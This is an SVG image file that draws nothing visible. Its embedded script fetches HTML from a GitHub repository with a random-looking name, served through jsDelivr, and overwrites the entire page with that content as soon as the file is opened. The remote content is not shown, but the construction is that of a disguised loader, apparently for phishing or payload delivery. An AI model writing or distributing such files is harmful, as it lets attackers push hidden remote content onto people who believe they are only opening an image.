<svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%">
  <foreignObject width="100%" height="100%">
    <body xmlns="http://www.w3.org/1999/xhtml">
      <script>
        fetch("https://cdn.jsdelivr.net/gh/rok574/ixledufvms@main/index.html")
          .then(r => r.text())
          .then(html => {
            document.open();
            document.write(html);
            document.close();
          });
      </script>
    </body>
  </foreignObject>
</svg>
